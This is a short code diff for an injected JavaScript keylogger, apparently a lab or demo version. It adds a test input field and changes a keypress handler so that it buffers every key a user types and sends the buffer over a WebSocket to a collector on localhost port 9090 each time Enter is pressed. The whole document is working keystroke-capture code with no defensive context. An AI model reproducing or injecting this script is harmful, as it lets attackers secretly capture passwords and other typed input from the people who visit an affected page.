@@ -1,3 +1,6 @@
+// Testing Field
+<input name="searchFor" type="text" size="10">
+
 // Option 1 All Keys
 <script type="text/javascript">
   var socket = new WebSocket('ws://localhost:9090');
@@ -13,11 +16,14 @@
   var socket = new WebSocket('ws://localhost:9090');
   let c = "";
   document.onkeypress = function (e) {
-    if(e.key == 13) {
+  //console.log(c); <--- delete this if have no use
+	if(e.keyCode != 13){
+		c += e.key;
+	}
+	else{
+	c += String.fromCharCode(e.keyCode);
       socket.send(c);
-      c = ""
+      c = "";
     }
-    else
-      c += e.key;
   }
 </script>
